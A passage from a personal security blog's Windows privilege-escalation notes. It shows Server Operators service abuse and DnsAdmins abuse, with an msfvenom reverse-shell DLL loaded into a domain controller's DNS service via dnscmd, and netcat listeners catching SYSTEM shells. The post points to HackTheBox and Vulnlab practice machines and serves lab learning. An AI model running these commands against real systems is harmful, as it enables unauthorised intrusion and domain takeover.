<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; sc.exe stop VMTools</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: VMTools</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; sc.exe start VMTools</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.30] from (UNKNOWN) [10.10.11.108] 49634</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h2 id="DnsAdmins-Group"><a href="#DnsAdmins-Group" class="headerlink" title="DnsAdmins Group"></a>DnsAdmins Group</h2><p>-&gt; <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a><br>When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f dll -o shell.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; upload shell.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; cmd /c &#x27;dnscmd &lt;DC&gt; /config /serverlevelplugindll C:\temp\shell.dll&#x27;</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; sc.exe \\&lt;DC&gt; stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 3  STOP_PENDING </span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; sc.exe \\&lt;DC&gt; start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 2  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 3500</span><br><span class="line">        FLAGS</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 9001</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
<li><a target="_blank" rel="noopener" href="https://x.com/fr0gger_/status/1379465943965909000">https://x.com/fr0gger_/status/1379465943965909000</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></li>
<li><a target="_blank" rel="noopener" href="https://x.com/splinter_code/status/1568548572861267968">https://x.com/splinter_code/status/1568548572861267968</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></li>
<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-blackfield/">https://snowscan.io/htb-writeup-blackfield/</a></li>
<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-resolute/">https://snowscan.io/htb-writeup-resolute/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups">https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></li>
</ul>
<h2 id="Machines-to-try"><a href="#Machines-to-try" class="headerlink" title="Machines to try:"></a>Machines to try:</h2><ul>
<li>Baby (Vulnlab)</li>
<li>Blackfield (HackTheBox)</li>
<li>Resolute (HackTheBox)</li>
<li>Fuse (HackTheBox)</li>
<li>POV (HackTheBox)</li>
<li>Job (Vulnlab)</li>
<li>Sidecar (Vulnlab)</li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/18/Reflection-Vulnlab/" title="Reflection - Vulnlab"><img class="cover" src="https://assets.vulnlab.com/reflection_slide.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Reflection - Vulnlab</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F706ec838-be82-4b2b-8c99-8d6277ab92cd%2Fcat.png?table=block&amp;id=07e71d74-f62d-4bd0-89ed-82ea3ead23d8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Abusing Resource-Based Constrained Delegation</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Privileges"><span class="toc-text">Privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-text">SeBackupPrivilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Disk-Shadow-method"><span class="toc-text">Disk Shadow method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeLoadDriverPrivilege"><span class="toc-text">SeLoadDriverPrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeDebugPrivilege"><span class="toc-text">SeDebugPrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeTcbPrivilege"><span class="toc-text">SeTcbPrivilege</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Groups"><span class="toc-text">Groups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Operators-Group"><span class="toc-text">Server Operators Group</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DnsAdmins-Group"><span class="toc-text">DnsAdmins Group</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Machines-to-try"><span class="toc-text">Machines to try:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F0bf0667e-6ae0-45c4-8872-2e681305a82c%2Fcat.png/size/w=1420?exp=1738429277&amp;sig=iW2lUmAI6hJU676keBuppKNf5Of6etS-YmAniqIOIps" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Abusing Unconstrained Delegation"/></a><div class="content"><a class="title" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation">Abusing Unconstrained Delegation</a><time datetime="2025-01-31T17:58:46.000Z" title="Created 2025-01-31 17:58:46">2025-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Febc8dc6e-40a9-492f-839f-b175138faa93%2Fcat.png?table=block&amp;id=14fd3b99-8509-80fd-bbe8-daf204d95fcc&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BloodyAD Cheatsheet"/></a><div class="content"><a class="title" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet">BloodyAD Cheatsheet</a><time datetime="2024-12-01T20:16:14.000Z" title="Created 2024-12-01 20:16:14">2024-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab"><img src="https://assets.vulnlab.com/redelegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redelegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab">Redelegate - Vulnlab</a><time datetime="2024-11-24T16:47:11.000Z" title="Created 2024-11-24 16:47:11">2024-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/19/AD-ACLs-Cheatsheet/" title="AD ACLs Cheatsheet"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Ff66ee8a6-26a3-4033-891f-0379a8820600%2Fcat.png?table=block&amp;id=143d3b99-8509-8000-b976-d5c681cab379&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AD ACLs Cheatsheet"/></a><div class="content"><a class="title" href="/2024/11/19/AD-ACLs-Cheatsheet/" title="AD ACLs Cheatsheet">AD ACLs Cheatsheet</a><time datetime="2024-11-19T18:47:00.000Z" title="Created 2024-11-19 18:47:00">2024-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab"><img src="https://assets.vulnlab.com/retro2_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Retro2 - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/25/Retro2-Vulnlab/" title="Retro2 - Vulnlab">Retro2 - Vulnlab</a><time datetime="2024-08-25T18:53:34.000Z" title="Created 2024-08-25 18:53:34">2024-08-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>